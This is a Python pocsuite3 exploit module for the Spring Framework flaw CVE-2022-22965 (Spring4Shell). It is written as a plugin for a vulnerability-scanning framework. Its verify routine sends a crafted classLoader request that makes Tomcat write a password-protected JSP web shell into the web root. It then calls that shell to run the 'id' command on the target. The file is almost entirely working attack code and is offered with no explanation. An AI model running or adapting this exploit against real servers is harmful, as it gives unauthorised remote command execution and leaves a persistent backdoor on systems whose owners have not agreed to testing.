# !/usr/bin/env python
# -*- coding: UTF-8 -*-
from urllib.parse import urlparse
import time
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from urllib.parse import quote,unquote
import random
import string

class spring_core_rce(POCBase):
    vulID = 'CVE-2022-22965'
    version = '1.0'
    author = ['Warin9_0']
    vulDate = '2022-03-31'
    createDate = '2022-03-31'
    updateDate = '2022-03-31'
    references = ['']
    name = 'spring_core_rce'
    appPowerLink = ''
    appName = 'spring_core_rce'
    appVersion = """spring_core_rce"""
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''spring_core_rce'''
    samples = ['']
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        target = self.url
        self.timeout = 5
        if target:
            try:
                self.timeout = 5
                Sname = ''.join(random.sample(string.ascii_letters + string.digits, 5))
                Spwd = ''.join(random.sample(string.ascii_letters + string.digits, 16))
                vulurl = target
                parse = urlparse(vulurl)
                headers = {
                     "Host": "{}".format(parse.netloc),
                    "suffix": "%>//",
                    "c1": "Runtime",
                    "c2": "<%",
                    "DNT": "1",
                    "Content-Type": "application/x-www-form-urlencoded"
                }
                data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22{Spwd}%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix={Sname}&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=".format(
                    Sname=Sname, Spwd=Spwd)

                try:
                    r = requests.post(vulurl, data=data,headers=headers, allow_redirects=False,timeout=self.timeout,verify=False)
                except Exception as e:
                    print(e)
                else:
                    path = "/{Sname}.jsp?pwd={Spwd}&cmd=id".format(Sname=Sname, Spwd=Spwd)
                    Gurl = vulurl + path
                    if r.status_code == 200 :
                        try:
                            time.sleep(10)
                            resq = requests.get(Gurl,timeout=self.timeout,allow_redirects=False,verify=False)
                            print(resq.status_code)
                        except Exception as e:
                            print(e)
                            return False
                        else:
                            if resq.status_code == 200 and "uid=" in resq.text and "groups=" in resq.text and "gid=" in resq.text:
                                    result['VerifyInfo'] = {}
                                    result['VerifyInfo']['URL'] = Gurl
                                    result['VerifyInfo']['result'] = resq.text
            except Exception as e:
                print(e)

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(spring_core_rce)
